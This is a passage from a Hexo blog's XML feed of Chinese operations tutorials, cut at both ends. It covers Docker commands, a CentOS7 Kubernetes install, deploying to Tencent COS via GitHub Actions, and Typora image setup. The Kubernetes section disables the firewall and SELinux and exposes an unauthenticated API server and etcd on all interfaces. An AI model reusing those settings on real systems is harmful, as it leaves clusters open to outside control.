class="hljs-number">35730</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker学习笔记</title>
    <link href="/2021/09/newpost-22/"/>
    <url>/2021/09/newpost-22/</url>
    
    <content type="html"><![CDATA[<p><strong>基于centos7，root登录</strong>，笔记为<a href="https://www.bilibili.com/video/BV1CJ411T7BK?p=1">黑马程序员Docker容器化技术，从零学会Docker教程</a>学习笔记</p><h2 id="一、安装docker-ce并配置自启动"><a href="#一、安装docker-ce并配置自启动" class="headerlink" title="一、安装docker-ce并配置自启动"></a>一、安装docker-ce并配置自启动</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum install -y yum-utils device-mapper-persistent-data lvm2<br>yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo<br>yum -y install docker-ce docker-ce-cli containerd.io<br></code></pre></td></tr></table></figure><span id="more"></span><h3 id="2-启动并设置开机自启"><a href="#2-启动并设置开机自启" class="headerlink" title="2.启动并设置开机自启"></a>2.启动并设置开机自启</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl <span class="hljs-built_in">enable</span> docker &amp;&amp; systemctl start docker<br></code></pre></td></tr></table></figure><h3 id="3-查看docker版本"><a href="#3-查看docker版本" class="headerlink" title="3.查看docker版本"></a>3.查看docker版本</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker -v</span><br></code></pre></td></tr></table></figure><h3 id="4-配置镜像加速"><a href="#4-配置镜像加速" class="headerlink" title="4.配置镜像加速"></a>4.配置镜像加速</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/docker<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://xxxxx.mirror.aliyuncs.com&quot;</span>]<br>&#125;<br>EOF<br><span class="hljs-built_in">sudo</span> systemctl daemon-reload<br><span class="hljs-built_in">sudo</span> systemctl restart docker<br></code></pre></td></tr></table></figure><ul><li>其中<code>https://xxxxx.mirror.aliyuncs.com</code>改为你自己的镜像地址，可通过阿里云-控制台-容器镜像服务-镜像工具-镜像加速器得到地址，如下图</li></ul><img src="/2021/09/newpost-22/image-20210910165711245.png" class="" title="image-20210910165711245"><h2 id="二、常用命令"><a href="#二、常用命令" class="headerlink" title="二、常用命令"></a>二、常用命令</h2><h4 id="1-服务相关命令"><a href="#1-服务相关命令" class="headerlink" title="1.服务相关命令"></a>1.服务相关命令</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl start docker <span class="hljs-comment"># 启动</span><br>systemctl stop docker <span class="hljs-comment"># 停止</span><br>systemctl restart docker <span class="hljs-comment"># 重启</span><br>systemctl status docker <span class="hljs-comment"># 状态</span><br>systemctl <span class="hljs-built_in">enable</span> docker <span class="hljs-comment"># 开机启动</span><br></code></pre></td></tr></table></figure><h4 id="2-镜像相关命令"><a href="#2-镜像相关命令" class="headerlink" title="2.镜像相关命令"></a>2.镜像相关命令</h4><img src="/2021/09/newpost-22/image-20210910172723513.png" class="" title="image-20210910172723513"><ul><li><p>查看本地镜像<code>docker images</code></p><ul><li>REPOSITORY 仓库（镜像名称）</li><li>TAG 版本</li><li>IMAGE ID 镜像ID</li><li>CREATED 创建时间</li><li>SIZE 大小</li></ul></li><li><p>搜索镜像，以redis为例<code>docker search redis</code></p></li><li><p>下载镜像，以redis为例<code>docker pull redis</code></p><ul><li>查找版本<a href="https://hub.docker.com/">dockerHub</a></li><li>下载指定版本，以redis为例<code>docker pull redis:5.0</code></li></ul></li><li><p>删除镜像<code>docker rmi xxxx</code></p><ul><li>通过名称加版本，以redis为例<code>docker rmi docker:latest</code></li><li>通过镜像id，<code>docker rmi 02c7f2054405</code></li><li>删除所有镜像<strong>docker rmi `docker images -q`</strong></li></ul></li></ul><h4 id="3-容器相关命令"><a href="#3-容器相关命令" class="headerlink" title="3.容器相关命令"></a>3.容器相关命令</h4><img src="/2021/09/newpost-22/image-20210910172751390.png" class="" title="image-20210910172751390"><ul><li><p>创建容器<code>docker run -it --name=c7 centos:7 /bin/bash</code></p><ul><li><code>-i</code>表示一直运行</li><li><code>-t</code>表示分配终端</li><li><code>-d</code>后台运行<code>docker run -id --name=c72 centos:7</code></li><li><code>--name</code> 起名</li><li><code>exit</code>退出容器</li><li><code>-it</code>创建的一般称为交互式容器，<code>-id</code>为守护式容器</li></ul></li><li><p>查看容器</p><ul><li>正在运行<code>docker ps</code></li><li>所有<code>docker ps -a</code></li></ul></li><li><p>进入容器<code>docker exec -it c72 /bin/bash</code></p></li><li><p>启停删容器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker start c72 <span class="hljs-comment"># 启动容器</span><br>docker stop c72 <span class="hljs-comment"># 停止容器</span><br>docker <span class="hljs-built_in">rm</span> c72 <span class="hljs-comment"># 删除容器</span><br></code></pre></td></tr></table></figure></li><li><p>查看容器信息<code>docker inspect c72</code></p></li></ul><h2 id="三、数据卷"><a href="#三、数据卷" class="headerlink" title="三、数据卷"></a>三、数据卷</h2><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul><li>数据卷是宿主机中的一个目录或者文件</li><li>一个数据卷可被多个容器挂载，一个容器也可以挂载多个数据卷</li></ul><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul><li>容器数据持久化</li><li>数据交换</li></ul><h3 id="配置数据卷"><a href="#配置数据卷" class="headerlink" title="配置数据卷"></a>配置数据卷</h3><ul><li><p>创建时</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">docker</span></span> run ... -v 宿主机目录(文件):容器内目录(文件) ...<br></code></pre></td></tr></table></figure><ul><li>目录必须是绝对路径</li><li>目录不存在会自动创建</li><li>可以挂载多个数据卷，多个<code>-v 宿主机目录(文件):容器内目录(文件)</code></li></ul></li></ul><h3 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h3><img src="/2021/09/newpost-22/image-20210910180140147.png" class="" title="image-20210910180140147"><h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CentOS7安装k8s集群</title>
    <link href="/2021/09/newpost-21/"/>
    <url>/2021/09/newpost-21/</url>
    
    <content type="html"><![CDATA[<h2 id="准备机器"><a href="#准备机器" class="headerlink" title="准备机器"></a>准备机器</h2><p>准备机器，本次以虚拟机示范，系统都是CentOS7，以root用户的登录，实际应用中如果使用虚拟机，可以先创建一台，然后完成master和node都需要的配置之后，再克隆出多台。本次演示的机器ip分别为：</p><span id="more"></span><table><thead><tr><th>机器</th><th>IP</th></tr></thead><tbody><tr><td>master</td><td>192.168.0.89</td></tr><tr><td>node1</td><td>192.168.0.90</td></tr><tr><td>node2</td><td>192.168.0.91</td></tr><tr><td>node3</td><td>192.168.0.92</td></tr><tr><td>node4</td><td>192.168.0.93</td></tr></tbody></table><h2 id="所有机器配置"><a href="#所有机器配置" class="headerlink" title="所有机器配置"></a>所有机器配置</h2><h3 id="1-关闭防火墙服务和selinx，避免与docker容器的防火墙规则冲突"><a href="#1-关闭防火墙服务和selinx，避免与docker容器的防火墙规则冲突" class="headerlink" title="1.关闭防火墙服务和selinx，避免与docker容器的防火墙规则冲突"></a>1.关闭防火墙服务和selinx，避免与docker容器的防火墙规则冲突</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl stop firewalld<br>systemctl <span class="hljs-built_in">disable</span> firewalld<br>setenforce 0<br></code></pre></td></tr></table></figure><h3 id="2-安装epel-release源"><a href="#2-安装epel-release源" class="headerlink" title="2.安装epel-release源"></a>2.安装epel-release源</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install epel-release<br></code></pre></td></tr></table></figure><h2 id="master机器配置"><a href="#master机器配置" class="headerlink" title="master机器配置"></a>master机器配置</h2><h3 id="1-安装etcd和kubernetes-master"><a href="#1-安装etcd和kubernetes-master" class="headerlink" title="1.安装etcd和kubernetes-master"></a>1.安装etcd和kubernetes-master</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install etcd kubernetes-master<br></code></pre></td></tr></table></figure><h3 id="2-编辑etcd配置-etc-etcd-etcd-conf"><a href="#2-编辑etcd配置-etc-etcd-etcd-conf" class="headerlink" title="2.编辑etcd配置/etc/etcd/etcd.conf"></a>2.编辑etcd配置<code>/etc/etcd/etcd.conf</code></h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ETCD_NAME</span>=default<br><span class="hljs-attr">ETCD_DATA_DIR</span>=<span class="hljs-string">&quot;/var/lib/etcd/default.etcd&quot;</span><br><span class="hljs-attr">ETCD_LISTEN_CLIENT_URLS</span>=<span class="hljs-string">&quot;http://0.0.0.0:2379&quot;</span><br><span class="hljs-attr">ETCD_ADVERTISE_CLIENT_URLS</span>=<span class="hljs-string">&quot;http://localhost:2379&quot;</span><br></code></pre></td></tr></table></figure><h3 id="3-编辑kubernetes的apiserver配置-etc-kubernetes-apiserver"><a href="#3-编辑kubernetes的apiserver配置-etc-kubernetes-apiserver" class="headerlink" title="3.编辑kubernetes的apiserver配置/etc/kubernetes/apiserver"></a>3.编辑kubernetes的apiserver配置<code>/etc/kubernetes/apiserver</code></h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">KUBE_API_ADDRESS</span>=<span class="hljs-string">&quot;--insecure-bind-address=0.0.0.0&quot;</span><br><span class="hljs-attr">KUBE_API_PORT</span>=<span class="hljs-string">&quot;--port=8080&quot;</span><br><span class="hljs-attr">KUBELET_PORT</span>=<span class="hljs-string">&quot;--kubelet-port=10250&quot;</span><br><span class="hljs-attr">KUBE_ETCD_SERVERS</span>=<span class="hljs-string">&quot;--etcd-servers=http://127.0.0.1:2379&quot;</span><br><span class="hljs-attr">KUBE_SERVICE_ADDRESSES</span>=<span class="hljs-string">&quot;--service-cluster-ip-range=10.254.0.0/16&quot;</span><br><span class="hljs-attr">KUBE_ADMISSION_CONTROL</span>=<span class="hljs-string">&quot;--admission-control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ResourceQuota&quot;</span><br><span class="hljs-attr">KUBE_API_ARGS</span>=<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="4-启动etcd、kube-apiserver、kube-controller-manager、kube-scheduler服务，并设置开机启动"><a href="#4-启动etcd、kube-apiserver、kube-controller-manager、kube-scheduler服务，并设置开机启动" class="headerlink" title="4.启动etcd、kube-apiserver、kube-controller-manager、kube-scheduler服务，并设置开机启动"></a>4.启动etcd、kube-apiserver、kube-controller-manager、kube-scheduler服务，并设置开机启动</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-keyword">for</span> SERVICES <span class="hljs-keyword">in</span> etcd kube-apiserver kube-controller-manager kube-scheduler; <span class="hljs-keyword">do</span> systemctl restart <span class="hljs-variable">$SERVICES</span>;systemctl <span class="hljs-built_in">enable</span> <span class="hljs-variable">$SERVICES</span>;systemctl status <span class="hljs-variable">$SERVICES</span> ; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="5-在etcd中定义flannel网络"><a href="#5-在etcd中定义flannel网络" class="headerlink" title="5.在etcd中定义flannel网络"></a>5.在etcd中定义flannel网络</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">etcdctl mk /atomic.io/network/config <span class="hljs-string">&#x27;&#123;&quot;Network&quot;:&quot;172.17.0.0/16&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="所有node机器配置"><a href="#所有node机器配置" class="headerlink" title="所有node机器配置"></a>所有node机器配置</h2><h3 id="1-安装flannel和kubernetes-node"><a href="#1-安装flannel和kubernetes-node" class="headerlink" title="1.安装flannel和kubernetes-node"></a>1.安装flannel和kubernetes-node</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install flannel kubernetes-node<br></code></pre></td></tr></table></figure><h3 id="2-为flannel网络指定etcd服务，修改-etc-sysconfig-flanneld文件"><a href="#2-为flannel网络指定etcd服务，修改-etc-sysconfig-flanneld文件" class="headerlink" title="2.为flannel网络指定etcd服务，修改/etc/sysconfig/flanneld文件"></a>2.为flannel网络指定etcd服务，修改<code>/etc/sysconfig/flanneld</code>文件</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">FLANNEL_ETCD</span>=<span class="hljs-string">&quot;http://192.168.0.89:2379&quot;</span><br><span class="hljs-attr">FLANNEL_ETCD_KEY</span>=<span class="hljs-string">&quot;/atomic.io/network&quot;</span><br></code></pre></td></tr></table></figure><ul><li>其中<code>192.168.0.89</code>改为你真实master机器ip</li></ul><h3 id="3-修改-etc-kubernetes-config文件"><a href="#3-修改-etc-kubernetes-config文件" class="headerlink" title="3.修改/etc/kubernetes/config文件"></a>3.修改<code>/etc/kubernetes/config</code>文件</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">KUBE_LOGTOSTDERR</span>=<span class="hljs-string">&quot;--logtostderr=true&quot;</span><br><span class="hljs-attr">KUBE_LOG_LEVEL</span>=<span class="hljs-string">&quot;--v=0&quot;</span><br><span class="hljs-attr">KUBE_ALLOW_PRIV</span>=<span class="hljs-string">&quot;--allow-privileged=false&quot;</span><br><span class="hljs-attr">KUBE_MASTER</span>=<span class="hljs-string">&quot;--master=http://192.168.0.89:8080&quot;</span><br></code></pre></td></tr></table></figure><ul><li>其中<code>192.168.0.89</code>改为你真实master机器ip</li></ul><h3 id="4-修改node配置文件-etc-kubernetes-kubelet"><a href="#4-修改node配置文件-etc-kubernetes-kubelet" class="headerlink" title="4.修改node配置文件/etc/kubernetes/kubelet"></a>4.修改node配置文件<code>/etc/kubernetes/kubelet</code></h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">KUBELET_ADDRESS</span>=<span class="hljs-string">&quot;--address=0.0.0.0&quot;</span><br><span class="hljs-attr">KUBELET_PORT</span>=<span class="hljs-string">&quot;--port=10250&quot;</span><br><span class="hljs-attr">KUBELET_HOSTNAME</span>=<span class="hljs-string">&quot;--hostname-override=192.168.0.90&quot;</span><br><span class="hljs-attr">KUBELET_API_SERVER</span>=<span class="hljs-string">&quot;--api-servers=http://192.168.0.89:8080&quot;</span> <span class="hljs-comment">#指定Master节点的API Server</span><br><span class="hljs-attr">KUBELET_POD_INFRA_CONTAINER</span>=<span class="hljs-string">&quot;--pod-infra-container-image=registry.access.redhat.com/rhel7/pod-infrastructure:latest&quot;</span><br><span class="hljs-attr">KUBELET_ARGS</span>=<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><ul><li>其中<code>192.168.0.89</code>改为你真实master机器ip</li><li>其中<code>192.168.0.90</code>改为当前node自己的ip</li></ul><h3 id="5-在所有Node节点上启动kube-proxy-kubelet-docker-flanneld服务，并设置开机启动"><a href="#5-在所有Node节点上启动kube-proxy-kubelet-docker-flanneld服务，并设置开机启动" class="headerlink" title="5.在所有Node节点上启动kube-proxy,kubelet,docker,flanneld服务，并设置开机启动"></a>5.在所有Node节点上启动kube-proxy,kubelet,docker,flanneld服务，并设置开机启动</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-keyword">for</span> SERVICES <span class="hljs-keyword">in</span> kube-proxy kubelet docker flanneld;<span class="hljs-keyword">do</span> systemctl restart <span class="hljs-variable">$SERVICES</span>;systemctl <span class="hljs-built_in">enable</span> <span class="hljs-variable">$SERVICES</span>;systemctl status <span class="hljs-variable">$SERVICES</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="验证集群是否成功"><a href="#验证集群是否成功" class="headerlink" title="验证集群是否成功"></a>验证集群是否成功</h2><p>在master机器上执行<code>kubectl get node</code>，成功如下：</p><img src="/2021/09/newpost-21/image-20210910151627724.png" class="" title="image-20210910151627724"><p>参考：<a href="https://www.cnblogs.com/xkops/p/6169034.html">k8s入门系列之集群安装篇</a>，<a href="https://blog.csdn.net/weixin_40538774/article/details/104842345">CENTOS部署K8S</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过Github Actions部署静态网站到腾讯云COS，并自动刷新CDN</title>
    <link href="/2021/07/newpost-20/"/>
    <url>/2021/07/newpost-20/</url>
    
    <content type="html"><![CDATA[<h2 id="一、腾讯云操作"><a href="#一、腾讯云操作" class="headerlink" title="一、腾讯云操作"></a>一、腾讯云操作</h2><ul><li>进入腾讯云控制台-云产品-基础存储服务-对象存储-存储桶列表-创建存储桶</li></ul><span id="more"></span><img src="/2021/07/newpost-20/image-20210730102303271.png" class="" title="image-20210730102303271"><ul><li>进入新建的存储桶-基础配置-静态网站-开启</li></ul><img src="/2021/07/newpost-20/image-20210730102455492.png" class="" title="image-20210730102455492"><ul><li>自定义CDN加速域名，添加域名，并把自定义的域名解析到后边的CNAME</li></ul><img src="/2021/07/newpost-20/image-20210730102842438.png" class="" title="image-20210730102842438"><ul><li>进入CDN与加速-内容分发网络-域名管理-找到刚刚的域名-管理</li></ul><img src="/2021/07/newpost-20/image-20210730103303891.png" class="" title="image-20210730103303891"><ul><li>然后HTTPS配置-配置证书，按提示输入自有证书，或者申请腾讯云证书，推荐开启强制跳转</li></ul><img src="/2021/07/newpost-20/image-20210730103537297.png" class="" title="image-20210730103537297"><ul><li>进入个人-访问管理-访问秘钥-API秘钥管理-新建秘钥，<strong>注意，这个秘钥权限极高，务必妥善保管！</strong></li></ul><img src="/2021/07/newpost-20/image-20210730104011479.png" class="" title="image-20210730104011479"><p>至此，腾讯云相关配置全部完成，下一步需要用到的有：刚刚创建API秘钥SecretId与SecretKey，存储桶名称和所属地域、之前配置的域名（这三个不属于机密数据）。</p><img src="/2021/07/newpost-20/image-20210730104358482.png" class="" title="image-20210730104358482"><h2 id="二、Github操作"><a href="#二、Github操作" class="headerlink" title="二、Github操作"></a>二、Github操作</h2><ul><li><p>首先有个仓库用来存储静态网页数据，也可存储类似于hexo源码之类的通过actions自动部署(参考<a href="/2021/07/newpost-18/">Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器</a>)，此步不详解。</p></li><li><p>进入仓库-Settings-Secrets-New secret，分别新建两条名为<code>TCLOUD_API_ID</code>和<code>TCLOUD_API_KEY</code>，值为上边获取到的API秘钥<code>SecretId</code>与<code>SecretKey</code>，存储在Secrets里的内容是很安全的，只有仓库所有者和协作者有权使用，但也仅限于使用，没有人可以查看其内容。</p></li></ul><img src="/2021/07/newpost-20/image-20210730110052838.png" class="" title="image-20210730110052838"><ul><li>进入仓库Actions-new workflow</li></ul><img src="/2021/07/newpost-20/image-20210730105824125.png" class="" title="image-20210730105824125"><ul><li>set up a workflow yourself</li></ul><img src="/2021/07/newpost-20/image-20210730105850716.png" class="" title="image-20210730105850716"><ul><li>编辑如下，将其中的<code>blog-1252906577</code>和<code>ap-shanghai</code>改为你自己的存储桶名称和地域，<code>https://blog.ctftools.com/</code>改为自己的域名，<code>./public/</code>该为自己需要上传的本地路径，如<code>./</code>，注意如果传根目录建议把<code>.git</code>加入忽略目录，例如<code>coscmd upload -rfs --delete ./ / --ignore &quot;./.git/*&quot;</code></li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">name:</span> <span class="hljs-string">静态网站持续集成</span><br><br><span class="hljs-attr">on:</span> <br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span><br><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">build:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>        <br>    <span class="hljs-attr">steps:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">检出仓库代码</span><br>      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装腾讯云依赖</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        sudo pip install coscmd</span><br><span class="hljs-string">        sudo pip install tccli</span><br><span class="hljs-string"></span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">配置腾讯云依赖</span><br>      <span class="hljs-attr">env:</span><br>        <span class="hljs-attr">SECRET_ID:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.TCLOUD_API_ID</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">SECRET_KEY:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.TCLOUD_API_KEY</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">BUCKET:</span> <span class="hljs-string">blog-1252906577</span> <span class="hljs-comment">#改为自己的存储桶名称</span><br>        <span class="hljs-attr">REGION:</span> <span class="hljs-string">ap-shanghai</span> <span class="hljs-comment">#改为自己的地域</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        coscmd config -a $SECRET_ID -s $SECRET_KEY -b $BUCKET -r $REGION</span><br><span class="hljs-string">        tccli configure set secretId $SECRET_ID</span><br><span class="hljs-string">        tccli configure set secretKey $SECRET_KEY</span><br><span class="hljs-string">        tccli configure set region $REGION</span><br><span class="hljs-string"></span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">上传到腾讯云COS并刷新CDN</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        coscmd upload -rfs --delete ./public/ /</span><br><span class="hljs-string">        tccli cdn PurgePathCache --cli-unfold-argument --Paths https://blog.ctftools.com/ --FlushType flush</span><br></code></pre></td></tr></table></figure><p>上边的代码通过<code>tccli</code>刷新CDN，也可参考<a href="https://www.ioiox.com/archives/69.html">这篇文章</a>通过<code>腾讯云SCF云函数</code>刷新CDN</p>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>经验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用Typora编写Hexo博客时图片的处理</title>
    <link href="/2021/07/newpost-19/"/>
    <url>/2021/07/newpost-19/</url>
    
    <content type="html"><![CDATA[<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>1.使用Typora编写Hexo博客时，可以直接本地拖拽图片(或复制图片粘贴，后同不赘述)到Typora编辑器，并且能正常预览；</p><p>2.部署Hexo时图片也能正常显示；</p><p>3.图片放在hexo目录里，不依赖其他平台。</p><span id="more"></span><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="1-Typora配置"><a href="#1-Typora配置" class="headerlink" title="1.Typora配置"></a>1.Typora配置</h3><p>点击<code>文件</code>-<code>偏好设置</code>-<code>图像</code>，如下图配置，即可在拖拽本地文件到Typora编辑器时，自动复制图片到<code>文章.md</code>所在目录与文件同名目录下，请勾选<code>优先使用相对路径</code>，然后点击右上角<code>X</code>关闭<code>偏好设置</code></p><img src="/2021/07/newpost-19/QQ%E6%88%AA%E5%9B%BE20210728174925.png" class="" title="QQ截图20210728174925"><p>此操作完成后，拖拽图片可以看到路径变成类似下图</p><img src="/2021/07/newpost-19/image-20210728175340652.png" class="" title="image-20210728175340652"><h3 id="2-Hexo配置"><a href="#2-Hexo配置" class="headerlink" title="2.Hexo配置"></a>2.Hexo配置</h3><p>终端中切换到hexo目录，通过以下命令安装<code>hexo-image-link</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install hexo-image-link --save<br></code></pre></td></tr></table></figure><p>打开<code>_config.yml</code>，配置<code>post_asset_folder</code>为<code>true</code></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>参考<a href="https://github.com/cocowool/hexo-image-link">hexo-image-link</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>经验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo + Github Actions 提交代码自动部署 云服务器 腾讯云COS github-pages</title>
    <link href="/2021/07/newpost-18/"/>
    <url>/2021/07/newpost-18/</url>
    
    <content type="html"><![CDATA[<h1 id="最终成果"><a href="#最终成果" class="headerlink" title="最终成果"></a>最终成果</h1><p>编写文章后只需提交代码，之后自动构建hexo生成public文件夹，并自动将其发布到你需要的平台，还可以自动生成release用于存档，方便随时回滚到过去任意一版博客。</p><span id="more"></span><p><strong>本文要求已经对Hexo有一点了解，并且知道怎么把hexo源码放到github，如果您刚接触Hexo，可以参考<a href="/2017/12/post233/">Hexo安装配置并托管至github</a></strong></p><p><strong>如果不想依赖github，可以参考这套自建方案<a href="/2020/11/post249/">centos下hexo + svn + jenkins实现博客自动部署</a>、<a href="/2020/11/newpost-1/">svn提交后jenkins自动部署</a></strong></p><h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><h2 id="一、新建仓库存放Hexo源码"><a href="#一、新建仓库存放Hexo源码" class="headerlink" title="一、新建仓库存放Hexo源码"></a>一、新建仓库存放Hexo源码</h2><p>如果有了就不用新建，这里存放的是hexo源码，可以公开也可以私有，具体方法不赘述。</p><h2 id="二、创建Github-Actions实现自动构建Hexo得到public"><a href="#二、创建Github-Actions实现自动构建Hexo得到public" class="headerlink" title="二、创建Github Actions实现自动构建Hexo得到public"></a>二、创建Github Actions实现自动构建Hexo得到public</h2><ul><li>进入仓库Actions-new workflow</li></ul><img src="/2021/07/newpost-18/image-20210730105824125.png" class="" title="image-20210730105824125"><ul><li>set up a workflow yourself</li></ul><img src="/2021/07/newpost-18/image-20210730105850716.png" class="" title="image-20210730105850716"><ul><li>编辑如下后提交保存，其中Node版本可以自己修改</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 